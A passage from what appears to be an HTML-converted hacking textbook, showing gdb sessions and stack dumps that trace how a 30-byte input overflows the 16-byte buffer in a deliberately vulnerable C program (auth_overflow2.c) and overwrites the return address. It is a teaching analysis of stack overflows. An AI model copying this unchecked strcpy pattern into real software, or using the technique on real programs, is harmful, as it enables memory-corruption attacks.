left;">0xb7ff47b0</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048510</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7e8</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7dc:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484bb</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9b7</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048510</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff848</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7ec:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xb7eafebc</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000002</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff874</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff880</p></td></tr><tr style="height:14pt"><td style="width:57pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb)</p></td><td style="width:66pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Similar breakpoints are set, and an examination of memory shows that <span class="s31">auth_flag </span>(shown in bold above and below) is located before <span class="s31">password_buffer </span>in memory. This means <span class="s31">auth_flag </span>can never be overwritten by an overflow in <span class="s31">password_buffer</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_357.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) cont Continuing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 36pt;text-indent: -17pt;line-height: 107%;text-align: left;">Breakpoint 2, check_authentication (password=0xbffff9b7 &#39;A&#39; &lt;repeats 30 times&gt;) at auth_overflow2.c:16</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">16        return auth_flag; (gdb) x/s password_buffer</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff7c0:   &#39;A&#39; &lt;repeats 30 times&gt; (gdb) x/x &amp;auth_flag</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff7bc:  0x00000000 (gdb) x/16xw &amp;auth_flag</p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7bc:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x41414141</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x41414141</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x41414141</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7cc:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x41414141</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x41414141</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x41414141</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x41414141</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7dc:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x08004141</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9b7</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048510</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff848</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7ec:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb7eafebc</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000002</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff874</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff880</p></td></tr><tr style="height:14pt"><td style="width:57pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb)</p></td><td style="width:66pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">As expected, the overflow cannot disturb the <span class="s31">auth_flag </span>variable, since itâ€™s located before the buffer. But another execution control point does exist, even though you canâ€™t see it in the C code. Itâ€™s conveniently located after all the stack variables, so it can easily be overwritten. This memory is integral to the operation of all programs, so it exists in all programs, and when itâ€™s over- written, it usually results in a program crash.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_358.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) c Continuing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Program received signal SIGSEGV, Segmentation fault. 0x08004141 in ?? ()</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb)</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_359.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Recall from the previous chapter that the stack is one of five memory segments used by programs. The stack is a FILO data structure used to</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;">maintain execution flow and context for local variables during function calls. When a function is called, a structure called a <span class="s27">stack frame </span>is pushed onto the stack, and the EIP register jumps to the</p><table style="border-collapse:collapse;margin-left:3pt" cellspacing="0"><tr style="height:18pt"><td style="width:99pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s54" style="padding-top: 3pt;padding-left: 6pt;text-indent: 0pt;text-align: left;">return_value <span class="s58">variable</span></p></td></tr><tr style="height:51pt"><td style="width:99pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s54" style="padding-left: 6pt;text-indent: 0pt;text-align: left;">password_buffer <span class="s58">variable</span></p></td></tr><tr style="height:18pt"><td style="width:99pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s59" style="padding-top: 4pt;padding-left: 6pt;text-indent: 0pt;text-align: left;">Saved frame pointer (SFP)</p></td></tr><tr style="height:18pt"><td style="width:99pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s59" style="padding-top: 4pt;padding-left: 6pt;text-indent: 0pt;text-align: left;">Return address (<span class="s60">ret</span>)</p></td></tr><tr style="height:18pt"><td style="width:99pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s54" style="padding-top: 4pt;padding-left: 6pt;text-indent: 0pt;text-align: left;">*password <span class="s58">(func argument)</span></p></td></tr><tr style="height:19pt"><td style="width:99pt;border-top-style:solid;border-top-width:1pt;border-top-color:#231F20;border-left-style:solid;border-left-width:1pt;border-left-color:#231F20;border-right-style:solid;border-right-width:1pt;border-right-color:#231F20"><p class="s54" style="padding-top: 4pt;padding-left: 6pt;text-indent: 0pt;text-align: left;">main()<span class="s58">â€™s stack frame</span></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"/><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">first instruction of the function. Each stack frame contains the local variables for that function and a return address so EIP can be restored. When the function is done, the stack frame is popped off the stack and the return address is used to restore EIP. All of this is built in to the architecture and is usually handled by the compiler, not the programmer.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">When the <span class="s31">check_authentication() </span>function is called, a new stack frame is pushed onto the stack above <span class="s31">main()</span>â€™s stack frame. In this frame</p><p style="text-indent: 0pt;text-align: left;"><span><img width="132" height="16" alt="image" src="Image_360.png"/></span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">are the local variables, a return address, and the functionâ€™s arguments.</p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;">We can see all these elements in the debugger.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_361.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g auth_overflow2.c reader@hacking:~/booksrc $ gdb -q ./a.out</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) list 1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1   #include &lt;stdio.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">2   #include &lt;stdlib.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">3   #include &lt;string.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">4</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">5   int check_authentication(char *password) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">6        char password_buffer[16];</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">7        int auth_flag = 0;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">9       strcpy(password_buffer, password);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">10</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">11      if(strcmp(password_buffer, &quot;brillig&quot;) == 0)</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">12           auth_flag = 1;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">13       if(strcmp(password_buffer, &quot;outgrabe&quot;) == 0)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">14           auth_flag = 1;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">15</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">16       return auth_flag;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">17   }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">18</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">19   int main(int argc, char *argv[]) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">20       if(argc &lt; 2) { (gdb)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">21            printf(&quot;Usage: %s &lt;password&gt;\n&quot;, argv[0]);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">22           exit(0);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">23       }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">24      if(check_authentication(argv[1])) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">25           printf(&quot;\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">26            printf(&quot;    Access Granted.\n&quot;);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">27           printf(&quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">28       } else {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">29           printf(&quot;\nAccess Denied.\n&quot;);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">30    }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) break 24</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1 at 0x80484ab: file auth_overflow2.c, line 24. (gdb) break 9</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 2 at 0x8048421: file auth_overflow2.c, line 9. (gdb) break 16</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 3 at 0x804846f: file auth_overflow2.c, line 16. (gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, main (argc=2, argv=0xbffff874) at auth_overflow2.c:24</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">24      if(check_authentication(argv[1])) { (gdb) i r esp</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">esp       0xbffff7e0    0xbffff7e0 (gdb) x/32xw $esp</p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:10pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7e0:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb8000ce0</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048510</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff848</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7eafebc</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7f0:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x00000002</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff874</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff880</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xb8001898</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff800:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000001</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000001</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff810:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb8000ce0</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff848</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff820:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x40f5f7f0</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x48e0fe81</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000000</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff830:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xb7ff9300</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xb7eafded</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xb8000ff4</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff840:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000002</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048350</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048371</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff850:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048474</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000002</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff874</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048510</p></td></tr><tr style="height:14pt"><td style="width:57pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb)</p></td><td style="width:66pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 107%;text-align: left;">The first breakpoint is right before the call to <span class="s31">check_authentication() </span>in <span class="s31">main()</span>. At this point, the stack pointer register (ESP) is <span class="s31">0xbffff7e0</span>, and the top of the stack is shown. This is all part of <span class="s31">main()</span>â€™s stack frame. Continu- ing to the next breakpoint inside <span class="s31">check_authentication()</span>, the output below shows ESP is smaller as it moves up the list of memory to make room for <span class="s31">check_authentication()</span>â€™s stack frame (shown in bold), which is now on the stack. After finding the addresses of the <span class="s31">auth_flag </span>variable (<span class="s53">0</span>) and the variable <span class="s31">password_buffer </span>(<span class="s53">@</span>), their locations can be seen within the stack frame.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_362.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) c Continuing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 2, check_authentication (password=0xbffff9b7 &#39;A&#39; &lt;repeats 30 times&gt;) at auth_overflow2.c:9</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">9      strcpy(password_buffer, password); (gdb) i r esp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">esp       0xbffff7a0    0xbffff7a0 (gdb) x/32xw $esp</p><table style="border-collapse:collapse;margin-left:16.9376pt" cellspacing="0"><tr style="height:10pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7a0:</p></td><td style="width:69pt"><p class="s42" style="padding-right: 12pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00000000</p></td><td style="width:68pt"><p class="s45" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08049744</p></td><td style="width:65pt"><p class="s45" style="padding-left: 10pt;padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7b8</p></td><td style="width:62pt"><p class="s45" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x080482d9</p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7b0:</p></td><td style="width:69pt"><p class="s45" style="padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xb7f9f729</p></td><td style="width:68pt"><p class="s45" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7fd6ff4</p></td><td style="width:65pt"><p class="s45" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7e8</p></td><td style="width:62pt"><p class="s61" style="padding-right: 3pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0<span class="s42">0x00000000</span></p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7c0:</p></td><td style="width:69pt"><p class="s61" style="padding-right: 13pt;text-indent: 0pt;line-height: 9pt;text-align: right;">E)<span class="s45">0xb7fd6ff4</span></p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff880</p></td><td style="width:65pt"><p class="s45" style="padding-left: 9pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7e8</p></td><td style="width:62pt"><p class="s45" style="padding-right: 3pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xb7fd6ff4</p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7d0:</p></td><td style="width:69pt"><p class="s45" style="padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xb7ff47b0</p></td><td style="width:68pt"><p class="s45" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048510</p></td><td style="width:65pt"><p class="s45" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7e8</p></td><td style="width:62pt"><p class="s45" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x080484bb</p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7e0:</p></td><td style="width:69pt"><p class="s45" style="padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff9b7</p></td><td style="width:68pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048510</p></td><td style="width:65pt"><p class="s42" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff848</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xb7eafebc</p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7f0:</p></td><td style="width:69pt"><p class="s42" style="padding-right: 12pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00000002</p></td><td style="width:68pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff874</p></td><td style="width:65pt"><p class="s42" style="padding-left: 10pt;padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff880</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xb8001898</p></td></tr><tr style="height:11pt"><td style="width:56pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff800:</p></td><td style="width:69pt"><p class="s42" style="padding-right: 12pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00000000</p></td><td 